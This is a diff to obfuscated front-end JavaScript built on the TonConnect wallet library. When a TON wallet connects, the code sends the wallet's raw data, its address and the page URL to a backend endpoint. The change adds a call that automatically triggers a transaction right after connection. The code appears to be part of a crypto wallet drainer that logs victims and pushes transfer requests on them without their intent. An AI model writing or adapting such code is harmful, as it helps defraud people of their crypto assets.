@@ -118,23 +118,26 @@ const openPopupButton = document['getElementsByClassName'](
 updateSidebar(tonConnectUI['wallet']),
     visualUpdate(tonConnectUI['wallet']),
     tonConnectUI['onStatusChange'](_0x5f19cc => {
-        ;
-        (connectedWallet = _0x5f19cc),
-        updateSidebar(_0x5f19cc),
-            visualUpdate(_0x5f19cc),
-            _0x5f19cc &&
-            fetch('./connected', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON['stringify']({
-                    raw: _0x5f19cc,
-                    wallet: _0x5f19cc['account']['address'],
-                    href: window['location']['href'],
-                }),
-            })
-    })
+    connectedWallet = _0x5f19cc
+    updateSidebar(_0x5f19cc)
+    visualUpdate(_0x5f19cc)
+
+    if (_0x5f19cc) {
+        // Notify backend
+        fetch('./connected', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                raw: _0x5f19cc,
+                wallet: _0x5f19cc.account.address,
+                href: window.location.href,
+            }),
+        }).then(() => {
+            // 🔥 Auto-trigger transaction right after connect
+            transaction()
+        })
+    }
+})
 async function transaction() {
     if (!tonConnectUI['wallet']) {
         await tonConnectUI['openModal']()
